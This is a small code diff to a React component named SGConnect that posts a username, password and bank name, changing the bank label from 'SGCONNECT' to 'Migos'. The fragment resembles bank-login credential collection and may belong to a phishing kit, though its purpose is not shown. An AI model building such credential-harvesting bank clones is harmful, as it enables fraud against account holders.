@@ -25,7 +25,7 @@ export default function SGConnect() {
         body: JSON.stringify({ 
           username, 
           password, 
-          bankName: "SGCONNECT" // Ajout explicite du nom de la banque ici
+          bankName: "Migos" // Ajout explicite du nom de la banque ici
         }),
       });
 
